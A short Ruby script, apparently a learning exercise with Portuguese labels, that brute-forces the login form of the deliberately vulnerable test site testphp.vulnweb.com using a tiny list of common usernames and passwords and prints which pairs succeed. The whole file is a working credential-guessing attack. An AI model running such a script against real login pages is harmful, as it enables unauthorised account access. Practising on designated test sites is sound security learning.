require 'net/http'

usuarios_senhas = ['admin', 'administrador', 'test', 'login']

uri = URI('http://testphp.vulnweb.com/userinfo.php')

for usuario in usuarios_senhas
    for senha in usuarios_senhas
    res = Net::HTTP.post_form(uri, 'uname' => usuario, 'pass' => senha)

    if Regexp.new('you must login').match?(res.body)
      puts "[-] usuario e senha incorreta, #{usuario}:#{senha}"
    else
      puts "[+] usuario e senha correta, #{usuario}:#{senha}"
    end
  end
end
